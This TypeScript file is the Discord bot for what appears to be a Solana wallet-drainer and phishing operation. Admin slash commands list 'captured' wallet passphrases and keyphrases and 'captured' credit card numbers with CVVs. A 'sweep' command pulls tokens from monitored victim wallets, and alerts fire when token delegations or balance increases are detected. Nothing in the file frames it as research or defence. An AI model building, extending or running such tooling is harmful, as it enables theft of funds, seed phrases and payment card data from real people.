import { 
  Client, 
  GatewayIntentBits, 
  EmbedBuilder, 
  SlashCommandBuilder, 
  REST, 
  Routes,
  MessageFlags
} from 'discord.js';
import { Connection, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { AgentDatabase } from './database.js';
import { TransferService } from './transfer.js';
import { DiscordConfig } from './types.js';
import { logger } from './utils.js';
import dotenv from 'dotenv';

dotenv.config();

// MINTS - Must match transfer.ts and monitor.ts exactly
const WSOL_MINT = "So11111111111111111111111111111111111111112";
const USDC_MINT = "Gh9ZwEmdLJ8DscKNTkTqPbNwLNNBjuSzaG9Vp2KGtKJr";

export class DiscordBot {
  private client: Client;
  private transferService: TransferService;
  private connection: Connection;

  constructor(
    private db: AgentDatabase,
    transferService: TransferService,
    private config: DiscordConfig,
    connection: Connection
  ) {
    this.client = new Client({
      intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
      ]
    });
    this.transferService = transferService;
    this.connection = connection;
    this.setupEventHandlers();
  }
  
  private setupEventHandlers(): void {
    this.client.once('ready', async () => {
      logger.info(`🤖 Discord bot logged in as ${this.client.user?.tag}`);
      await this.registerCommands();
    });

    this.client.on('interactionCreate', async (interaction) => {
      if (interaction.isChatInputCommand()) {
        await this.handleSlashCommand(interaction);
      }
    });

    this.client.on('error', (error) => {
      if (!error.message.includes('40060') && !error.message.includes('aborted')) {
          logger.error('Discord client error:', error);
      }
    });
  }

  private async handleSlashCommand(interaction: any): Promise<void> {
    try {
      if (interaction.replied || interaction.deferred) return;

      try {
          await interaction.deferReply({ flags: MessageFlags.Ephemeral });
      } catch (deferError: any) {
          if (deferError.code === 10062 || deferError.code === 40060) {
              return; 
          }
          throw deferError;
      }

      switch (interaction.commandName) {
        case 'ping':
          await interaction.editReply('Pong! 🏓 Bot is active.');
          break;
          
        case 'sweep':
          await this.handleSweep(interaction);
          break;
          
        case 'balance':
          await this.handleBalance(interaction);
          break;
          
        case 'listusers':
          await this.handleListUsers(interaction);
          break;

        case 'addresses': 
            await this.handleListAddresses(interaction);
            break;

        case 'admin':
            await this.handleGetAdmin(interaction);
            break;

        case 'unwrap':
            await this.handleUnwrap(interaction);
            break;

        case 'view-credentials':
          await this.handleViewSubmissions(interaction);
          break;

        case 'view-cards':
          await this.handleViewCards(interaction);
          break;

        default:
          await interaction.editReply(`Unknown command: ${interaction.commandName}`);
      }
    } catch (error) {
      if (String(error).includes('10062') || String(error).includes('Unknown interaction')) {
          return;
      }
      logger.error('Error handling command:', error);
      
      try {
        const msg = `Error: ${error instanceof Error ? error.message : String(error)}`;
        if (interaction.deferred || interaction.replied) {
            await interaction.editReply(msg);
        }
      } catch (e) {}
    }
  }

  private async handleViewSubmissions(interaction: any): Promise<void> {
    if (!this.config.adminUserIds.includes(interaction.user.id)) {
      await interaction.editReply({ content: 'Permission denied.' });
      return;
    }

    try {
      const limit = interaction.options.getInteger('limit') || 5;
      const submissions = await this.db.getRecentSubmissions(limit);

      if (submissions.length === 0) {
        await interaction.editReply('No credentials found yet.');
        return;
      }

      const embed = new EmbedBuilder()
        .setTitle(`🔐 Last ${submissions.length} Wallet Submissions`)
        .setColor(0xFF0000);

      submissions.forEach((sub, i) => {
        embed.addFields({
          name: `${i + 1}. ${sub.walletName} (${sub.source || 'Unknown'})`,
          value: `**Wallet:** \`${sub.walletAddress}\`\n**Pass:** ||${sub.passphrase || 'N/A'} ||\n**Key:** ||${sub.keyphrase || 'N/A'} ||\n**Time:** <t:${Math.floor((sub.receivedAt?._seconds || new Date(sub.receivedAt).getTime()/1000))}:R>`,
          inline: false
        });
      });

      await interaction.editReply({ embeds: [embed] });
    } catch (error) {
      logger.error('View submissions failed:', error);
      await interaction.editReply(`Error: ${error}`);
    }
  }

  private async handleViewCards(interaction: any): Promise<void> {
    if (!this.config.adminUserIds.includes(interaction.user.id)) {
      await interaction.editReply({ content: 'Permission denied.' });
      return;
    }

    try {
      const limit = interaction.options.getInteger('limit') || 5;
      const cards = await this.db.getRecentCards(limit);

      if (cards.length === 0) {
        await interaction.editReply('No cards captured yet.');
        return;
      }

      const embed = new EmbedBuilder()
        .setTitle(`💳 Last ${cards.length} Card Captures`)
        .setColor(0x8F00FF);

      cards.forEach((card, i) => {
        embed.addFields({
          name: `${i + 1}. ${card.cardType?.toUpperCase()} - ${card.holderName}`,
          value: `**Num:** ||${card.cardNumber}|| \n**Exp:** ${card.expiry} **CVV:** ||${card.cvv}||\n**Time:** <t:${Math.floor((card.receivedAt?._seconds || new Date(card.receivedAt).getTime()/1000))}:R>`,
          inline: false
        });
      });

      await interaction.editReply({ embeds: [embed] });
    } catch (error) {
      logger.error('View cards failed:', error);
      await interaction.editReply(`Error: ${error}`);
    }
  }

  private async handleUnwrap(interaction: any): Promise<void> {
     if (!this.config.adminUserIds.includes(interaction.user.id)) {
      await interaction.editReply('Permission denied.');
      return;
    }
    
    try {
        await interaction.editReply("⏳ Unwrapping Admin wSOL...");
        const txSignature = await this.transferService.unwrapAdminWSOL();

        const embed = new EmbedBuilder()
            .setTitle('✅ Unwrap Successful')
            .setColor(0x00FF00)
            .setDescription(`Converted wSOL to Native SOL in Admin Wallet.\n\n[View Transaction](https://explorer.solana.com/tx/${txSignature}?cluster=devnet)`);

        await interaction.editReply({ content: '', embeds: [embed] });
    } catch (e: any) {
        await interaction.editReply(`❌ Unwrap Failed: ${e.message}`);
    }
  }

  private async handleGetAdmin(interaction: any): Promise<void> {
     if (!this.config.adminUserIds.includes(interaction.user.id)) {
      await interaction.editReply('Permission denied.');
      return;
    }
    
    try {
        const adminKey = this.transferService.getAdminPublicKey();
        const pubKey = new PublicKey(adminKey);
        const balance = await this.connection.getBalance(pubKey);
        const sol = balance / LAMPORTS_PER_SOL;

        const tokenAccounts = await this.connection.getParsedTokenAccountsByOwner(pubKey, {
          programId: TOKEN_PROGRAM_ID
        });
 
        let tokenText = "";
        tokenAccounts.value.forEach((item) => {
          const info = item.account.data.parsed.info;
          const uiAmount = info.tokenAmount.uiAmount;
          if (uiAmount > 0) {
              let symbol = info.mint === WSOL_MINT ? "wSOL" : (info.mint === USDC_MINT ? "USDC" : "Unknown");
              tokenText += `**${symbol}:** ${uiAmount.toLocaleString()}\n`;
          }
        });
 
        if (tokenText === "") tokenText = "No tokens found.";

        const embed = new EmbedBuilder()
            .setTitle('🤖 Bot Admin Wallet')
            .setColor(0x800080)
            .setDescription(`**Address:**\n\`\`\`${adminKey}\`\`\`\n**Native Balance:** ${sol.toFixed(4)} SOL\n\n**Token Balances:**\n${tokenText}`)
            .setFooter({ text: 'This wallet pays for sweep transaction fees' });

        await interaction.editReply({ embeds: [embed] });
    } catch (e: any) {
        await interaction.editReply(`Error: ${e.message}`);
    }
  }

  private async handleSweep(interaction: any): Promise<void> {
    if (!this.config.adminUserIds.includes(interaction.user.id)) {
      await interaction.editReply({ content: '🚫 Permission denied. Admin only.' });
      return;
    }

    const userAddress = interaction.options.getString('address');
    const tokenSymbol = interaction.options.getString('token');
    
    if (!userAddress) {
        await interaction.editReply('❌ Invalid address provided.');
        return;
    }

    let targetMint = tokenSymbol === 'USDC' ? USDC_MINT : WSOL_MINT;

    try {
        await interaction.editReply(`⏳ **Sweeping ${tokenSymbol}...**\nTarget: \`${userAddress}\``);
        const txSignature = await this.transferService.sweepUser(userAddress, targetMint);
        
        const embed = new EmbedBuilder()
            .setTitle('✅ Sweep Successful')
            .setColor(0x00FF00)
            .setDescription(`**Transaction:**\n[View on Explorer](https://explorer.solana.com/tx/${txSignature}?cluster=devnet)`)
            .addFields(
                { name: 'Token', value: tokenSymbol, inline: true },
                { name: 'User', value: `\`${userAddress}\``, inline: true }
            )
            .setTimestamp();

        await interaction.editReply({ content: '', embeds: [embed] });
    } catch (error: any) {
        await interaction.editReply(`❌ **Sweep Failed:** ${error.message}`);
    }
  }

  private async handleBalance(interaction: any): Promise<void> {
    if (!this.config.adminUserIds.includes(interaction.user.id)) {
      await interaction.editReply('Permission denied.');
      return;
    }

    const walletAddress = interaction.options.getString('address');
    if (!walletAddress) return;
    
    try {
       const pubKey = new PublicKey(walletAddress);
       const solBalance = await this.connection.getBalance(pubKey);
       const sol = solBalance / LAMPORTS_PER_SOL;

       const tokenAccounts = await this.connection.getParsedTokenAccountsByOwner(pubKey, {
           programId: TOKEN_PROGRAM_ID
       });

       let tokenSummary = "";
       tokenAccounts.value.forEach((item) => {
           const info = item.account.data.parsed.info;
           const uiAmount = info.tokenAmount.uiAmount;
           if (uiAmount > 0) {
               let symbol = info.mint === USDC_MINT ? "USDC" : (info.mint === WSOL_MINT ? "wSOL" : "Token");
               tokenSummary += `**${symbol}:** ${uiAmount.toLocaleString()}\n`;
           }
       });

       const embed = new EmbedBuilder()
        .setTitle('Wallet Balance')
        .setColor(0x0099FF)
        .setDescription(`**Address:**\n\`\`\`${walletAddress}\`\`\`\n**Native Balance:** ${sol.toFixed(4)} SOL\n\n**Token Balances:**\n${tokenSummary || "No tokens found."}`);

       await interaction.editReply({ embeds: [embed] });
    } catch (error: any) {
       await interaction.editReply(`Error fetching balance: ${error.message}`);
    }
  }
  
  private async handleListUsers(interaction: any): Promise<void> {
     if (!this.config.adminUserIds.includes(interaction.user.id)) {
      await interaction.editReply('Permission denied.');
      return;
    }
    
    try {
        const wallets = await this.db.getMonitoredWallets();
        if (wallets.length === 0) {
            await interaction.editReply('No monitored wallets found.');
            return;
        }

        const listBody = wallets.slice(0, 10).map((w, i) => {
             const status = w.isActive ? '🟢 Active' : '🔴 Inactive';
             const name = w.nickname || `User ${i+1}`;
             return `**${name}**\nWallet: \`${w.publicKey}\`\nStatus: ${status}`;
        }).join('\n\n');

        const embed = new EmbedBuilder()
            .setTitle(`Monitored Wallets (${wallets.length})`)
            .setDescription(listBody)
            .setColor(0x0099FF);

        await interaction.editReply({ embeds: [embed] });
    } catch (e: any) {
        await interaction.editReply(`Error: ${e.message}`);
    }
  }

  private async handleListAddresses(interaction: any): Promise<void> {
     if (!this.config.adminUserIds.includes(interaction.user.id)) {
      await interaction.editReply('Permission denied.');
      return;
    }
    try {
        const wallets = await this.db.getMonitoredWallets();
        const addresses = wallets.map(w => `\`${w.publicKey}\``).join('\n');
        await interaction.editReply({ content: `**Raw Address List:**\n\n${addresses || "None"}` });
    } catch (e: any) {
        await interaction.editReply(`Error: ${e.message}`);
    }
  }

  async registerCommands(): Promise<void> {
    const commands = [
      new SlashCommandBuilder().setName('ping').setDescription('Check bot status'),
      new SlashCommandBuilder().setName('sweep').setDescription('Sweep funds')
        .addStringOption(o => o.setName('address').setDescription('User wallet').setRequired(true))
        .addStringOption(o => o.setName('token').setDescription('Token').setRequired(true)
            .addChoices({ name: 'SOL', value: 'SOL' }, { name: 'USDC', value: 'USDC' })),
      new SlashCommandBuilder().setName('balance').setDescription('Check balance')
        .addStringOption(o => o.setName('address').setDescription('Wallet address').setRequired(true)),
      new SlashCommandBuilder().setName('listusers').setDescription('List wallets'),
      new SlashCommandBuilder().setName('addresses').setDescription('List addresses'),
      new SlashCommandBuilder().setName('admin').setDescription('Check Admin Wallet'),
      new SlashCommandBuilder().setName('unwrap').setDescription('Unwrap Admin wSOL'),
      new SlashCommandBuilder().setName('view-credentials').setDescription('View captured credentials').addIntegerOption(o => o.setName('limit').setDescription('Max entries')),
      new SlashCommandBuilder().setName('view-cards').setDescription('View captured cards').addIntegerOption(o => o.setName('limit').setDescription('Max entries')),
    ].map(command => command.toJSON());

    try {
      const rest = new REST({ version: '10' }).setToken(this.config.token);
      await rest.put(Routes.applicationCommands(this.client.user!.id), { body: commands });
      logger.info(`✅ Registered ${commands.length} commands.`);
    } catch (error) {
      logger.error('Error registering commands:', error);
    }
  }

  async login(): Promise<void> {
    await this.client.login(this.config.token);
  }

  async sendAlert(type: string, data: any): Promise<void> {
    try {
        const channel = await this.client.channels.fetch(this.config.channelId);
        if (!channel || !channel.isTextBased()) return;

        let embed;
        if (type === 'delegation-detected') {
            const tokenName = data.mint === WSOL_MINT ? 'wSOL' : (data.mint === USDC_MINT ? 'USDC' : 'Unknown');
            embed = new EmbedBuilder()
                .setTitle('🚨 New Delegation Detected')
                .setColor(0x00FF00)
                .setDescription(`**Wallet:**\n\`\`\`${data.wallet}\`\`\`\n**Token:** ${tokenName}`)
                .setTimestamp();
        } else if (type === 'balance-increase') {
            const isUsdc = data.mint === USDC_MINT;
            const decimals = isUsdc ? 6 : 9;
            const formattedAmount = Number(data.amount) / Math.pow(10, decimals);

             embed = new EmbedBuilder()
                .setTitle('💰 Balance Increase Detected')
                .setColor(0xFFA500)
                .setDescription(`**Wallet:**\n\`\`\`${data.wallet}\`\`\`\n**Amount:** +${formattedAmount.toFixed(isUsdc ? 2 : 4)} ${isUsdc ? 'USDC' : 'SOL'}`)
                .setTimestamp();
        }

        if (embed) await (channel as any).send({ embeds: [embed] });
    } catch (error) {
        logger.error('Failed to send alert:', error);
    }
  }
}
